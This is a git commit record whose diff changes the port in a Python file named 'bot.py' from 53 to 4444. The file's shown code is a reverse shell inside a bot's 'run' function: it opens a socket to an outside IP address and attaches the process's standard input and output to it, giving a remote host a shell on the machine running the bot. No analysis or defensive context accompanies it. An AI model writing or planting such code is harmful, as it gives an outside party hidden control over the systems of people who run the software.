dd0c67cd84c8c843e4db4e94314a6d95760c6dde
gizzardlizzard <141071142+gizzardlizzard@users.noreply.github.com>
2024-01-24 19:27:17 -0500

    Change RPORT to 4444

--- bot.py
+++ bot.py
@@ -4,7 +4,7 @@ import socket,os,pty
 
 def run(ctx):
     RHOST="3.145.201.117"
-    RPORT=53
+    RPORT=4444
     s=socket.socket()
     s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
     [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
